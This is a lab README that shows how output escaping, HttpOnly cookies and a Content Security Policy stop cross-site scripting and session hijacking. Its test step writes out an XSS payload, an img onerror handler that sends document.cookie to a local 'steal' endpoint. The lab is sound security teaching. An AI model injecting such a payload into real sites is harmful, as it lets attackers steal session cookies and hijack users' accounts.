# Step 3: Securing the Application (Defense in Depth)

This lab demonstrates how to secure a web application against Cross-Site Scripting (XSS) and Session Hijacking using a multi-layered defensive strategy. 

Rather than relying on a single point of failure, this step implements three enterprise-grade defenses to neutralize the attacks demonstrated in Step 1.

## The Defenses Implemented

1. **Server-Side Output Escaping:** The Go backend uses `html.EscapeString()` to convert dangerous characters (like `<` and `>`) into safe HTML entities (like `&lt;` and `&gt;`). This forces the browser to render the payload as harmless text rather than executing it as code.
2. **HttpOnly Cookies:** The session cookie is flagged with the `HttpOnly` attribute. This explicitly instructs the browser to hide the cookie from the DOM, meaning malicious JavaScript (`document.cookie`) can no longer access or steal the session ID.
3. **Content Security Policy (CSP):** The server issues a strict `Content-Security-Policy` HTTP header. This acts as an allowlist, telling the browser exactly which scripts are authorized to run and blocking unauthorized inline event handlers (like our `onerror` exploit).

## How to Test the Defenses

1. Open your terminal in this directory (`02-xss-lab/step-3-secured`).
2. Build and start the Docker environment:
   ```bash
   docker-compose up --build -d
   ```
3. Attempt the Exploit:
    - Go to http://localhost:3000 and click Login.
    - Submit the classic payload into the comment box: <img src="x" onerror="fetch('http://localhost:4000/steal?data=' + document.cookie)">
4. *The Result: The attack fails completely. The browser renders the raw text of the payload harmlessly on the screen, proving the escaping worked. Even if it hadn't, the HttpOnly flag ensures the cookie cannot be stolen.*
5. Clean up: `docker-compose down -v`